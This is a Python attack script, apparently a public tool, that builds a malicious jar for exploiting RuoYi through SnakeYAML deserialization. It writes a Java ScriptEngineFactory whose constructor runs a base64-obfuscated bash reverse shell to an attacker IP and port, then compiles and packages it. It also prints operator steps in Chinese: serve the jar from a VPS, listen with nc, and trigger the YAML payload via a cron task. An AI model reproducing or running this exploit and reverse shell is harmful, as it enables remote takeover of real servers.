import os
import sys
import base64


ip=sys.argv[1]
port=sys.argv[2]

def base64linux_rebound_shell(ip,port):
    shell = f'bash -i >& /dev/tcp/{ip}/{port} 0>&1'
    base64shell = base64.b64encode(shell.encode('utf-8'))
    base64shell = base64shell.decode('utf-8')
    base64shell = 'bash -c {echo,'+base64shell+'}|{base64,-d}|{bash,-i}'
    return base64shell

payload='''
package artsploit;

import javax.script.ScriptEngine;
import javax.script.ScriptEngineFactory;
import java.io.IOException;
import java.util.List;

public class AwesomeScriptEngineFactory implements ScriptEngineFactory {

    public AwesomeScriptEngineFactory() {
        try {
            Runtime.getRuntime().exec("'''+base64linux_rebound_shell(ip,port)+'''");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    @Override
    public String getEngineName() {
        return null;
    }

    @Override
    public String getEngineVersion() {
        return null;
    }

    @Override
    public List<String> getExtensions() {
        return null;
    }

    @Override
    public List<String> getMimeTypes() {
        return null;
    }

    @Override
    public List<String> getNames() {
        return null;
    }

    @Override
    public String getLanguageName() {
        return null;
    }

    @Override
    public String getLanguageVersion() {
        return null;
    }

    @Override
    public Object getParameter(String key) {
        return null;
    }

    @Override
    public String getMethodCallSyntax(String obj, String m, String... args) {
        return null;
    }

    @Override
    public String getOutputStatement(String toDisplay) {
        return null;
    }

    @Override
    public String getProgram(String... statements) {
        return null;
    }

    @Override
    public ScriptEngine getScriptEngine() {
        return null;
    }
}

'''
#print(payload)

with open('src/artsploit/AwesomeScriptEngineFactory.java','w+') as f:
    f.write(payload)


os.system('javac src/artsploit/AwesomeScriptEngineFactory.java')
os.system('jar -cvf ruoyi.jar -C src/ .')
print("-------------------结果如下--------------------------\n")
file=os.path.exists('src/artsploit/AwesomeScriptEngineFactory.java')
if file is True:
    print("[+]jar包生成成功[+]\n")
else:
    print("[-]jar包生成失败,请重新生成![-]")


print("--------------------计划任务如下------------------------\n")
print("[+]生成jar包放在vps上,开启web服务,使目标服务器可以访问到[+]")
print("[+]使用python开启web访问[+]\n")
print("python3 -m http.server 8888")
print("python2 -m SimpleHTTPServer 8888\n")
print("[+]nc监听[+]\n")
print("nc -lvp 777\n")
print("[+]调用目标字符串:[+]\r\n")
print('''org.yaml.snakeyaml.Yaml.load('!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://ip:port/ruoyi.jar"]]]]')''')
print("\n[+]cron表达式:[+]\r\n")
print("0/10 * * * * ?")
print("-------------------------------------------------------")
print('Authon:G0mini')
print('github:https://github.com/G0mini/PyBy2')
if __name__ == '__main__':
    base64linux_rebound_shell(ip,port)